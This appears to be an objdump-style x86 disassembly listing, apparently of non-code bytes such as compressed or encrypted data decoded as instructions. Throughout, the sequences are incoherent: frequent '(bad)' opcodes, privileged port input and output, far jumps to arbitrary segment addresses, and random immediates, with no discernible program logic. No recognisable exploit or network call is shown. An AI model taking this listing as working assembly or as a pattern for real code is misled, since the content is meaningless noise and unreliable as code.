  4259c4:	xchg   DWORD PTR [edx*1+0x5c78806c],edx
  4259cb:	add    eax,0x4741664
  4259d0:	and    bh,BYTE PTR [edi]
  4259d2:	dec    ebp
  4259d3:	xor    al,0x1d
  4259d5:	dec    ebp
  4259d6:	inc    esp
  4259d7:	push   ds
  4259d8:	in     al,dx
  4259d9:	mov    cl,0xa0
  4259db:	dec    esp
  4259dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259dd:	fstp   TBYTE PTR cs:[edx]
  4259e0:	mov    esp,0x3b38be16
  4259e5:	xchg   esi,eax
  4259e6:	imul   esp,DWORD PTR [eax+0x30],0xffffffae
  4259ea:	lods   al,BYTE PTR ds:[esi]
  4259eb:	outs   dx,BYTE PTR ds:[esi]
  4259ec:	jb     0x4259e5
  4259ee:	adc    DWORD PTR [eax-0x1c774369],ebx
  4259f4:	mov    ah,0x54
  4259f6:	pop    ebp
  4259f7:	(bad)  
  4259f8:	call   0xa782a6fa
  4259fd:	jae    0x425985
  4259ff:	stos   BYTE PTR es:[edi],al
  425a00:	gs jl  0x425a12
  425a03:	cld    
  425a04:	lds    ebp,FWORD PTR [eax+0x133a7583]
  425a0a:	stos   DWORD PTR es:[edi],eax
  425a0b:	push   eax
  425a0c:	push   ecx
  425a0d:	fs pop edx
  425a0f:	add    BYTE PTR fs:[eax],al
	...
  425a72:	add    BYTE PTR [eax],al
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x667914f9]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	fistp  DWORD PTR [eax-0x19]
  425a8f:	xor    BYTE PTR [ebp-0x36eb05ac],bl
  425a95:	sbb    ebp,ebx
  425a97:	mov    ecx,0x8df13f98
  425a9c:	jmp    0x7ee75821
  425aa1:	dec    ecx
  425aa2:	call   0xd53:0xf9bf467f
  425aa9:	ss je  0x425a80
  425aac:	fdivr  QWORD PTR [edi-0x46]
  425aaf:	cmp    dl,0xca
  425ab2:	mov    ?,WORD PTR [eax+0x3f]
  425ab5:	nop
  425ab6:	rol    BYTE PTR [esi-0x1f4f2522],0x3e
  425abd:	push   0xde63a8ed
  425ac2:	add    al,BYTE PTR [eax]
  425ac4:	xchg   DWORD PTR [edi],ebp
  425ac6:	push   esi
  425ac7:	mov    ah,0x8e
  425ac9:	xchg   esp,eax
  425aca:	add    al,0x9f
  425acc:	aam    0x10
  425ace:	imul   BYTE PTR [ecx]
  425ad0:	cmp    al,0x5e
  425ad2:	sbb    ah,BYTE PTR [eax-0x76]
  425ad5:	pushf  
  425ad6:	cmp    BYTE PTR ss:[edi+0x79],ah
  425ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425adb:	push   ebp
  425adc:	dec    edi
  425add:	sub    ah,BYTE PTR [eax-0x5ef4bb1a]
  425ae3:	cwde   
  425ae4:	std    
  425ae5:	sub    DWORD PTR [ebp-0x46],0x58
  425ae9:	(bad)  
  425aea:	(bad)  
  425aeb:	mov    DWORD PTR [ecx],ebx
  425aed:	add    al,0x4b
  425aef:	out    0xbc,al
  425af1:	mov    ebp,0x8c0be25a
  425af6:	add    eax,0x211074c4
  425afb:	enter  0xda25,0x5c
  425aff:	sbb    DWORD PTR [ecx-0x30],edx
  425b02:	push   edx
  425b03:	(bad)  
  425b04:	sub    al,0xb
  425b06:	mov    ecx,0x9f67bc97
  425b0b:	lods   al,BYTE PTR ds:[esi]
  425b0c:	sbb    eax,0x5869063
  425b11:	pusha  
  425b12:	imul   esi,DWORD PTR [esi+0x2c],0x95e6c86a
  425b19:	scas   al,BYTE PTR es:[edi]
  425b1a:	push   ebx
  425b1b:	xor    ecx,esi
  425b1d:	jmp    0xcbf2aedb
  425b22:	repz shr DWORD PTR [ebp-0x5ba07ac9],1
  425b29:	mov    dh,0xf5
  425b2b:	into   
  425b2c:	retf   
  425b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b2e:	xor    dl,ch
  425b30:	fsubr  st,st(3)
  425b32:	pop    esp
  425b33:	(bad)  
  425b35:	das    
  425b36:	icebp  
  425b37:	ja     0x425b93
  425b39:	outs   dx,BYTE PTR ds:[esi]
  425b3a:	fbstp  TBYTE PTR [ecx+0x72]
  425b3d:	retf   
  425b3e:	sbb    DWORD PTR [ecx+0xe],edi
  425b41:	cmp    dh,ah
  425b43:	imul   esi,DWORD PTR [edx+0x62],0xd872af05
  425b4a:	in     al,dx
  425b4b:	jge    0x425aed
  425b4d:	push   esp
  425b4e:	add    al,0xeb
  425b50:	and    al,0xb3
  425b52:	ja     0x425af8
  425b54:	int3   
  425b55:	in     eax,dx
  425b56:	mov    ds,WORD PTR [eax-0x51]
  425b59:	lds    eax,FWORD PTR ds:0x6bbc107a
  425b5f:	add    al,0xa4
  425b61:	jae    0x425aed
  425b63:	ss call 0xb2f77d4b
  425b69:	repz lea edx,[edi-0x5d]
  425b6d:	into   
  425b6e:	push   0xc815de1d
  425b73:	(bad)  
  425b74:	outs   dx,DWORD PTR ds:[esi]
  425b75:	das    
  425b76:	xor    BYTE PTR [ebx+0x32],al
  425b79:	stos   BYTE PTR es:[edi],al
  425b7a:	push   esi
  425b7b:	cmp    BYTE PTR ss:[ecx],ch
  425b7e:	jnp    0x425bc6
  425b80:	ret    0x3e15
  425b83:	mov    al,0x72
  425b85:	sbb    eax,0xf6bbe3e1
  425b8a:	pop    ebp
  425b8b:	pop    ss
  425b8c:	shl    DWORD PTR [eax-0x5b],cl
  425b8f:	fild   DWORD PTR [eax]
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	test   eax,0xd437d2a9
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	mov    ds:0xc56ee1ad,al
  425c11:	rol    DWORD PTR [edi-0x68],1
  425c14:	cmp    bl,BYTE PTR [ebx+0x79fe9052]
  425c1a:	stos   DWORD PTR es:[edi],eax
  425c1b:	fsubr  QWORD PTR [eax+ecx*4-0xc]
  425c1f:	out    dx,al
  425c20:	inc    edi
  425c21:	mov    edx,0xd1fa6a67
  425c26:	in     eax,dx
  425c27:	daa    
  425c28:	sbb    ebp,DWORD PTR [ebx-0x5]
  425c2b:	test   al,0x3e
  425c2d:	push   es
  425c2e:	jbe    0x425c15
  425c30:	test   eax,0x7eccf3c2
  425c35:	sahf   
  425c36:	int    0x3
  425c38:	lea    esi,[eax+ebp*8]
  425c3b:	fcom   QWORD PTR [ecx+0x11]
  425c3e:	pop    esi
  425c3f:	push   esi
  425c40:	fdiv   QWORD PTR [ecx]
  425c42:	mov    ebx,0xda2ca6a9
  425c47:	sbb    cl,cl
  425c49:	in     al,0xfd
  425c4b:	pusha  
  425c4c:	repnz sbb BYTE PTR [ecx],dh
  425c4f:	das    
  425c50:	dec    ebp
  425c51:	mov    eax,ds:0x76e55ac6
  425c56:	ror    DWORD PTR [esi-0x6e],cl
  425c59:	pop    ds
  425c5a:	sub    al,0x9e
  425c5c:	sbb    al,0x9d
  425c5e:	fimul  WORD PTR [esi+0x3161635f]
  425c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c65:	pop    ebx
  425c66:	mov    bh,0xb2
  425c68:	xchg   ebx,eax
  425c69:	ret    
  425c6a:	sbb    al,0xc1
  425c6c:	scas   al,BYTE PTR es:[edi]
  425c6d:	push   cs
  425c6e:	push   0xf8f930ec
  425c73:	enter  0x7a2,0xfb
  425c77:	mov    ebp,DWORD PTR [eax+0xb2838e9]
  425c7d:	xchg   DWORD PTR [ebp+eiz*2+0x7cbdbf23],edx
  425c84:	pop    ebx
  425c85:	jae    0x425c9a
  425c87:	xchg   ebp,eax
  425c88:	ja     0x425ce6
  425c8a:	xor    eax,0x31c0be99
  425c8f:	std    
  425c90:	fwait
  425c91:	jmp    0x9d08:0x2edf531b
  425c98:	imul   edx,DWORD PTR [ecx],0xffffffc9
  425c9b:	fst    QWORD PTR [eax+eax*2]
  425c9e:	dec    edx
  425c9f:	repnz pop edi
  425ca1:	xchg   esp,eax
  425ca2:	iret   
  425ca3:	dec    DWORD PTR [edi]
  425ca5:	in     al,0xdf
  425ca7:	fsub   QWORD PTR [eax]
  425ca9:	mov    WORD PTR [eax-0x5843c627],fs
  425caf:	test   eax,0xda429a67
  425cb4:	or     BYTE PTR [esp+ebp*1+0x1f],bl
  425cb8:	inc    esi
  425cb9:	lock xor DWORD PTR [ebx],ebp
  425cbc:	mov    DWORD PTR [eax],ebp
  425cbe:	add    eax,0x3f3638bf
  425cc3:	fsub   st,st(2)
  425cc5:	int    0xd7
  425cc7:	das    
  425cc8:	pop    ss
  425cc9:	bound  ebp,QWORD PTR [edi]
  425ccb:	cmp    eax,0xbdf3097f
  425cd0:	(bad)  
  425cd1:	xor    eax,0x70e525f5
  425cd6:	je     0x425d38
  425cd8:	xchg   BYTE PTR [edi],al
  425cda:	cdq    
  425cdb:	addr16 out 0x0,al
  425cde:	dec    ebx
  425cdf:	fst    QWORD PTR [ecx+0x505cb84a]
  425ce5:	ins    BYTE PTR es:[edi],dx
  425ce6:	shr    DWORD PTR [eax],1
  425ce8:	mov    al,0xcb
  425cea:	sub    al,0xdf
  425cec:	add    esi,DWORD PTR gs:[edx-0x30]
  425cf0:	ret    0xaeae
  425cf3:	xor    al,BYTE PTR [ebx-0x55]
  425cf6:	retf   0x9ee6
  425cf9:	pop    ecx
  425cfa:	mov    dl,ah
  425cfc:	sub    BYTE PTR [edi-0x28],ah
  425cff:	daa    
  425d00:	sbb    eax,0x80ac0285
  425d05:	push   esi
  425d06:	xchg   ebx,eax
  425d07:	dec    eax
  425d08:	shr    BYTE PTR [edi+0x4d],1
  425d0b:	or     eax,0xa8a1cd64
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xf6db6142,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	pop    ecx
  425d8d:	sub    DWORD PTR [ebp-0x24],0xffffffce
  425d91:	xchg   ebx,eax
  425d92:	inc    DWORD PTR [edi]
  425d94:	aam    0x23
  425d96:	sub    DWORD PTR [ebx-0x316383],edi
  425d9c:	pop    ecx
  425d9d:	pusha  
  425d9e:	mov    al,ds:0x1b1621aa
  425da3:	mov    esi,0xd248ab4b
  425da8:	and    eax,0x32f45054
  425dad:	push   ebp
  425dae:	dec    esp
  425daf:	and    esi,DWORD PTR [edx-0x53520bd8]
  425db5:	ja     0x425d5f
  425db7:	(bad)  
  425db8:	cmp    bh,BYTE PTR [esi+0x58]
  425dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dbc:	cmp    edx,DWORD PTR [eax-0x60]
  425dbf:	(bad)  
  425dc0:	out    0x78,eax
  425dc2:	add    eax,0xeb417fad
  425dc7:	out    0x3b,al
  425dc9:	inc    ecx
  425dca:	loopne 0x425d66
  425dcc:	rcr    DWORD PTR [ebx+ecx*8+0x14],cl
  425dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dd1:	out    dx,eax
  425dd2:	cld    
  425dd3:	mov    dh,0x74
  425dd5:	ins    DWORD PTR es:[edi],dx
  425dd6:	test   dh,al
  425dd8:	mov    DWORD PTR [ebp-0x29],ecx
  425ddb:	test   BYTE PTR [ebp-0x28b8a7b7],bl
  425de1:	jbe    0x425d84
  425de3:	xchg   esi,eax
  425de4:	rcl    DWORD PTR [edx],1
  425de6:	mov    esi,0xe4893ade
  425deb:	scas   eax,DWORD PTR es:[edi]
  425dec:	xchg   esp,eax
  425ded:	mov    esi,0xf2c89004
  425df2:	bound  ebp,QWORD PTR [ebp+0x24e7033f]
  425df8:	fwait
  425df9:	sub    ah,0x9d
  425dfc:	and    BYTE PTR [esi+eax*2+0x9],ah
  425e00:	push   0x45
  425e02:	inc    esp
  425e03:	fcmovbe st,st(1)
  425e05:	ins    BYTE PTR es:[edi],dx
  425e06:	stos   DWORD PTR es:[edi],eax
  425e07:	pusha  
  425e08:	arpl   WORD PTR ds:0xc1735bfa,bx
  425e0e:	inc    esi
  425e0f:	mov    al,0xb9
  425e11:	jmp    0x82c0:0xdebc591
  425e18:	or     DWORD PTR [ecx+0x5e],ecx
  425e1b:	cld    
  425e1c:	arpl   WORD PTR [ebx-0x34f79583],di
  425e22:	rcl    DWORD PTR [ecx+eiz*2],cl
  425e25:	aas    
  425e26:	xor    eax,0x89b4ebf5
  425e2b:	fldcw  WORD PTR [edx+0x67]
  425e2e:	mov    edi,0x35a7386c
  425e33:	fs int 0x96
  425e36:	adc    dh,BYTE PTR [esi+eax*2+0x28]
  425e3a:	fstp   TBYTE PTR [edi+0x6ec3603a]
  425e40:	mov    eax,0xae37594b
  425e45:	mov    dh,BYTE PTR [eax+0x2c25b0df]
  425e4b:	test   BYTE PTR [edx-0x7f65c491],ch
  425e51:	(bad)  
  425e52:	stos   BYTE PTR es:[edi],al
  425e53:	repnz mov edx,0x58760d16
  425e59:	stos   DWORD PTR es:[edi],eax
  425e5a:	dec    ebx
  425e5b:	inc    edx
  425e5c:	loop   0x425df6
  425e5e:	xchg   ebx,eax
  425e5f:	in     al,dx
  425e60:	pop    ebp
  425e61:	jmp    0xa9a43e65
  425e66:	idiv   BYTE PTR [edx+0x3f8b62f0]
  425e6c:	and    al,0xab
  425e6e:	mov    ds:0x761a343c,al
  425e73:	out    dx,eax
  425e74:	mov    ds:0x33db0080,eax
  425e79:	inc    esi
  425e7a:	or     BYTE PTR [ebx],bl
  425e7c:	fisubr DWORD PTR [edi]
  425e7e:	retf   0x60bc
  425e81:	inc    ecx
  425e82:	ds mov cl,0xb1
  425e85:	pusha  
  425e86:	(bad)  
  425e87:	jmp    0x425e0d
  425e89:	clc    
  425e8a:	and    DWORD PTR [ebp+0x6e],eax
  425e8d:	dec    eax
  425e8e:	pop    ebp
  425e8f:	jmp    0x425e91
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	cld    
  425f01:	sbb    ch,BYTE PTR [edi+0x194dcec]
  425f07:	add    BYTE PTR [ecx+eax*1],al
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	push   edx
  425f0d:	pusha  
  425f0e:	rcl    DWORD PTR [eax+0x1ffa7bcc],cl
  425f14:	aam    0x5b
  425f16:	cli    
  425f17:	cmp    al,BYTE PTR [bp+si-0x75]
  425f1b:	jmp    0x425efc
  425f1d:	mov    edi,0x5d246ee6
  425f22:	(bad)  
  425f23:	(bad)  
  425f24:	mov    esi,0x42567ac7
  425f29:	popf   
  425f2a:	push   ss
  425f2b:	cdq    
  425f2c:	xor    ah,ah
  425f2e:	in     eax,0xbe
  425f30:	push   0x138e7c52
  425f35:	push   esp
  425f36:	jecxz  0x425fab
  425f38:	std    
  425f39:	jb     0x425f29
  425f3b:	pop    es
  425f3c:	mov    WORD PTR [edx+0x5ad828ec],cs
  425f42:	push   cs
  425f43:	mov    esi,0x9292cd92
  425f48:	shr    BYTE PTR cs:[edi],cl
  425f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f4c:	cmc    
  425f4d:	fisttp QWORD PTR [ebp+0x59e47fca]
  425f53:	inc    ecx
  425f54:	push   esi
  425f55:	outs   dx,BYTE PTR ds:[esi]
  425f56:	test   eax,0xb2c9297f
  425f5b:	test   eax,0x8c0f1ceb
  425f60:	push   eax
  425f61:	lods   eax,DWORD PTR ds:[esi]
  425f62:	sahf   
  425f63:	aam    0x5c
  425f65:	aas    
  425f66:	arpl   WORD PTR [ecx],sp
  425f68:	popa   
  425f69:	jb     0x425f81
  425f6b:	jmp    0x425f7d
  425f6d:	add    al,0x5d
  425f6f:	nop
  425f70:	enter  0xffc4,0x4
  425f74:	nop
  425f75:	jmp    0x425fea
  425f77:	cmp    dh,dl
  425f79:	mov    eax,0x97a359fe
  425f7e:	jmp    0x425fbb
  425f80:	mov    ds:0xb3503bff,eax
  425f85:	pop    esi
  425f86:	scas   al,BYTE PTR es:[edi]
  425f87:	in     eax,dx
  425f88:	outs   dx,BYTE PTR gs:[esi]
  425f8a:	leave  
  425f8b:	pop    ebp
  425f8c:	lods   eax,DWORD PTR ds:[si]
  425f8e:	and    eax,0xeca4edce
  425f93:	stc    
  425f94:	jle    0x425fcf
  425f96:	push   ss
  425f97:	clc    
  425f98:	pop    esp
  425f99:	sbb    al,0xde
  425f9b:	push   cs
  425f9c:	xchg   ebp,eax
  425f9d:	jo     0x425fd8
  425f9f:	in     al,0xa1
  425fa1:	or     eax,0x8a5710dd
  425fa6:	(bad)  
  425fa7:	sti    
  425fa8:	or     eax,0x80b08454
  425fad:	out    0x20,eax
  425faf:	mov    ds:0x4a10073e,eax
  425fb4:	and    al,0x3d
  425fb6:	cmp    al,0x22
  425fb8:	sti    
  425fb9:	xchg   edx,eax
  425fba:	div    esi
  425fbc:	js     0x425f91
  425fbe:	outs   dx,BYTE PTR ds:[esi]
  425fbf:	test   DWORD PTR [eax],esp
  425fc1:	enter  0x36f4,0xc1
  425fc5:	enter  0xba88,0x1d
  425fc9:	sub    cl,BYTE PTR [eax]
  425fcb:	xor    dh,BYTE PTR [ecx]
  425fcd:	jl     0x426024
  425fcf:	mov    cl,ch
  425fd1:	hlt    
  425fd2:	popf   
  425fd3:	call   0x5613:0xe0472db7
  425fda:	push   0xffffff8d
  425fdc:	fsub   QWORD PTR [ecx]
  425fde:	jns    0x426059
  425fe0:	jl     0x425f83
  425fe2:	jg     0x426052
  425fe4:	daa    
  425fe5:	or     al,0xe0
  425fe7:	jmp    FWORD PTR [ecx+0x25]
  425fea:	sub    ah,BYTE PTR [edx+0x4c]
  425fed:	mov    ds:0x8a05f34a,eax
  425ff2:	fs ja  0x426014
  425ff5:	aas    
  425ff6:	xor    cl,cl
  425ff8:	dec    esi
  425ff9:	mov    BYTE PTR [ecx+0x1b0f623],al
  425fff:	adc    cl,bh
  426001:	aas    
  426002:	mov    dl,0xa
  426004:	xchg   edx,eax
  426005:	lock adc BYTE PTR [eax],dl
  426008:	nop    DWORD PTR [edx]
  42600b:	sbb    al,0x7d
  42600d:	out    0x10,eax
  42600f:	lock add BYTE PTR [eax],al
	...
  426072:	add    BYTE PTR [eax],al
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	cli    
  426081:	xlat   BYTE PTR ds:[ebx]
  426082:	sahf   
  426083:	leave  
  426084:	loopne 0x42601b
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	nop
  42608d:	push   eax
  42608e:	jbe    0x426089
  426090:	cmp    al,0x84
  426092:	scas   eax,DWORD PTR es:[edi]
  426093:	pop    eax
  426094:	xor    BYTE PTR [eax-0x6c],dh
  426097:	cwde   
  426098:	imul   DWORD PTR [ecx+ecx*1+0x298179ca]
  42609f:	mov    cl,0x12
  4260a1:	fisub  WORD PTR [esi]
  4260a3:	ins    DWORD PTR es:[edi],dx
  4260a4:	(bad)  
  4260a6:	cli    
  4260a7:	test   al,0xa4
  4260a9:	shl    BYTE PTR [edi+eiz*4+0x77],0x3
  4260ae:	push   esi
  4260af:	mov    WORD PTR ds:0x7a2bcc4a,es
  4260b5:	adc    al,0xfd
  4260b7:	jecxz  0x42610e
  4260b9:	rcl    DWORD PTR [ecx],0xe
  4260bc:	cmp    eax,0x51f22b76
  4260c1:	cli    
  4260c2:	(bad)  
  4260c3:	jge    0x4260c8
  4260c5:	retf   
  4260c6:	jmp    0x1b8262c6
  4260cb:	or     bh,BYTE PTR [bp+0x49]
  4260cf:	push   es
  4260d0:	mov    bh,BYTE PTR [bx+di-0x1399]
  4260d5:	mov    eax,ds:0xdaf37c1a
  4260da:	mov    edi,0xfe7dcf87
  4260df:	in     eax,0xc7
  4260e1:	mov    dl,0xd9
  4260e3:	(bad)  
  4260e4:	and    eax,0x621f9f71
  4260e9:	scas   eax,DWORD PTR es:[edi]
  4260ea:	jbe    0x426149
  4260ec:	adc    ch,BYTE PTR [ebx+0x70]
  4260ef:	mov    cl,0xd8
  4260f1:	gs pop edx
  4260f3:	dec    edi
  4260f4:	inc    edx
  4260f5:	add    BYTE PTR [ebx],ah
  4260f7:	sbb    edi,eax
  4260f9:	es jmp 0x5b3e9280
  4260ff:	push   ebx
  426100:	jns    0x42608a
  426102:	inc    edx
  426103:	lahf   
  426104:	jns    0x426144
  426106:	stc    
  426107:	mov    ds:0xe19e9537,eax
  42610c:	jno    0x4260b6
  42610e:	mov    ecx,DWORD PTR [eax]
  426110:	pusha  
  426111:	pop    es
  426112:	ja     0x4260ee
  426114:	mov    dh,0x11
  426116:	popa   
  426117:	cmp    ah,bh
  426119:	aaa    
  42611a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42611b:	pop    ecx
  42611c:	lds    ecx,FWORD PTR [ebx-0x1c6d466f]
  426122:	test   eax,0x868a6dca
  426127:	ret    0xde4a
  42612a:	les    esi,FWORD PTR [ebx]
  42612c:	mov    ebx,0xa82b4de
  426131:	pop    ecx
  426132:	inc    ebp
  426133:	lods   al,BYTE PTR ds:[esi]
  426134:	aas    
  426135:	or     BYTE PTR [esp+0x63],cl
  426139:	sbb    bh,cl
  42613b:	push   ecx
  42613c:	jmp    0x59dc1cd5
  426141:	sub    eax,edx
  426143:	cwde   
  426144:	out    0xa2,al
  426146:	repz dec edx
  426148:	push   es
  426149:	sub    eax,0x1e51cc3a
  42614e:	ins    DWORD PTR es:[edi],dx
  42614f:	sbb    eax,0x75cef062
  426154:	cmc    
  426155:	xchg   ebx,eax
  426156:	mov    eax,0xf4ff9303
  42615b:	sbb    BYTE PTR [ecx+0x62fcaf0b],al
  426161:	fcmovne st,st(5)
  426163:	mov    ch,0x91
  426165:	mov    edi,0x8a67fd07
  42616a:	stos   DWORD PTR es:[edi],eax
  42616b:	inc    esp
  42616c:	add    ecx,DWORD PTR [esi+0x6d]
  42616f:	loope  0x42613b
  426171:	icebp  
  426172:	or     edx,DWORD PTR [esi+0x182d577b]
  426178:	in     al,0xaa
  42617a:	cmp    eax,0x6ba04fef
  42617f:	pop    ebp
  426180:	stc    
  426181:	call   0x1602:0xe3fa0850
  426188:	pop    esi
  426189:	cwde   
  42618a:	jnp    0x4261f7
  42618c:	shl    DWORD PTR [ebp+0xae73],cl
	...
  4261f2:	add    BYTE PTR [eax],al
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x370a6227],0x4c
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	mov    ?,WORD PTR [eax]
  42620e:	cld    
  42620f:	push   ds
  426210:	jp     0x4261c1
  426212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426213:	inc    eax
  426214:	xchg   ebp,eax
  426215:	sub    esi,edx
  426217:	jmp    0x426207
  426219:	xchg   edi,eax
  42621a:	(bad)  
  42621b:	out    dx,al
  42621c:	cmp    ah,BYTE PTR [edi+0x585798af]
  426222:	push   ss
  426223:	test   BYTE PTR [esi+0x7e],bl
  426226:	ds data16 clc 
  426229:	clc    
  42622a:	push   ss
  42622b:	or     cl,dl
  42622d:	or     al,0xe3
  42622f:	fwait
  426230:	or     ecx,0x91d9c873
  426236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426237:	and    eax,0xf5c7825f
  42623c:	cmp    DWORD PTR [esi],esp
  42623e:	or     dl,0x1f
  426241:	dec    ecx
  426242:	pop    eax
  426243:	fstp   DWORD PTR [ebx+0x5a]
  426246:	icebp  
  426247:	and    eax,0xf5544861
  42624c:	test   al,0xd1
  42624e:	call   0x1a36:0x9dc20405
  426255:	mov    edi,0x68fc96e6
  42625a:	ret    0x3965
  42625d:	or     BYTE PTR [ebp+0x2c3911f9],0x94
  426264:	test   al,0xbc
  426266:	mov    ebx,DWORD PTR [ebx-0x28e94c9]
  42626c:	pop    esp
  42626d:	(bad)  
  42626e:	repz xor DWORD PTR [eax],ebx
  426271:	(bad)  
  426272:	(bad)  
  426273:	fwait
  426274:	xlat   BYTE PTR ds:[ebx]
  426275:	and    dh,BYTE PTR [esi]
  426277:	push   esp
  426278:	hlt    
  426279:	add    ah,BYTE PTR [edi+0x54]
  42627c:	xor    ebx,edx
  42627e:	hlt    
  42627f:	inc    esi
  426280:	xchg   ebx,eax
  426281:	test   al,dh
  426283:	adc    DWORD PTR [edi+0x1f729ea2],eax
  426289:	sar    DWORD PTR ds:[ecx+0x56],1
  42628d:	lods   al,BYTE PTR ds:[esi]
  42628e:	sub    ebp,DWORD PTR cs:[ebx-0xc]
  426292:	jge    0x426274
  426294:	mov    esi,0xc7964923
  426299:	adc    BYTE PTR [ebp-0x7c],dh
  42629c:	aas    
  42629d:	popa   
  42629e:	xor    ecx,DWORD PTR [esp+edi*2+0x35a8fcc3]
  4262a5:	or     esi,DWORD PTR [ebx+0x21]
  4262a8:	inc    eax
  4262a9:	imul   edi,DWORD PTR [edi-0x3c529708],0xf831c01e
  4262b3:	cwde   
  4262b4:	shl    ah,1
  4262b6:	xchg   ebp,eax
  4262b7:	(bad)  
  4262b8:	ds cwde 
  4262ba:	mov    ch,0x63
  4262bc:	push   ebx
  4262bd:	es mov dl,0x3b
  4262c0:	js     0x4262f5
  4262c2:	cmp    ah,bh
  4262c4:	outs   dx,DWORD PTR ds:[esi]
  4262c5:	jp     0x4262a4
  4262c7:	adc    eax,0xbac982ad
  4262cc:	dec    ebx
  4262cd:	lock and eax,0x9bd9db29
  4262d3:	mov    DWORD PTR [ebx],esp
  4262d5:	sub    BYTE PTR [ecx],ah
  4262d7:	lock fdivr QWORD PTR [edx-0x29255ea0]
  4262de:	dec    ecx
  4262df:	aas    
  4262e0:	das    
  4262e1:	fstp   TBYTE PTR [ebp+0x3b]
  4262e4:	inc    eax
  4262e5:	jb     0x426363
  4262e7:	rcl    DWORD PTR [ebx],1
  4262e9:	pop    eax
  4262ea:	xor    BYTE PTR [edx],al
  4262ec:	call   0x1256e3ff
  4262f1:	pushf  
  4262f2:	mov    ecx,0xdd8de018
  4262f7:	jno    0x4262cf
  4262f9:	lods   al,BYTE PTR ds:[esi]
  4262fa:	xor    eax,0x265dd33c
  4262ff:	aaa    
  426300:	mov    ch,0x81
  426302:	or     bl,BYTE PTR [edi+ebx*8+0x99c615b]
  426309:	int    0x8
  42630b:	repnz arpl dx,sp
  42630e:	and    ah,cl
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xc636038a
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [ebx-0x579b032a],cl
  426391:	not    esp
  426393:	daa    
  426394:	jle    0x4263b0
  426396:	(bad)  
  426397:	mov    ch,0xf9
  426399:	hlt    
  42639a:	mov    ecx,0x45008697
  42639f:	fisttp QWORD PTR [esi+ebx*2]
  4263a2:	mov    edx,0xd0f659cf
  4263a7:	(bad)  
  4263a8:	pop    ebp
  4263a9:	cmp    eax,0xf068f366
  4263ae:	lods   eax,DWORD PTR ds:[esi]
  4263af:	out    0x84,eax
  4263b1:	mov    bh,0xe0
  4263b3:	inc    esp
  4263b4:	ss sub BYTE PTR gs:[ecx],0x93
  4263b9:	add    DWORD PTR [esi-0x46],0xffffffe5
  4263bd:	sub    eax,0x96de7ca4
  4263c2:	inc    ecx
  4263c3:	(bad)  [ecx]
  4263c5:	cmp    ah,BYTE PTR [edi+ecx*1-0x3b32b9ef]
  4263cc:	push   0x504f883e
  4263d1:	adc    BYTE PTR ds:0xe099dc6e,bl
  4263d7:	cmp    DWORD PTR [ebx],ebx
  4263d9:	ret    
  4263da:	push   ebx
  4263db:	into   
  4263dc:	test   ch,al
  4263de:	mov    al,0x2b
  4263e0:	(bad)  
  4263e1:	fist   DWORD PTR [edi+0x55]
  4263e4:	adc    BYTE PTR [ecx-0x3298b462],bl
  4263ea:	jne    0x426390
  4263ec:	adc    eax,DWORD PTR [edi+0x40]
  4263ef:	dec    edi
  4263f0:	aad    0x2c
  4263f2:	fwait
  4263f3:	push   esi
  4263f4:	retf   0x5d4d
  4263f7:	in     eax,0xc8
  4263f9:	cdq    
  4263fa:	pusha  
  4263fb:	test   BYTE PTR [esi+0x4a2fccac],ch
  426401:	mov    cl,0x6d
  426403:	inc    esp
  426404:	inc    edi
  426405:	test   BYTE PTR [edi+0x7eee8eae],bl
  42640b:	(bad)  
  42640d:	sub    BYTE PTR [ebp+0x30695463],ah
  426413:	mov    edx,0x4bd01bae
  426418:	lea    edx,[eax-0x3]
  42641b:	jecxz  0x4263f2
  42641d:	mov    ah,0x14
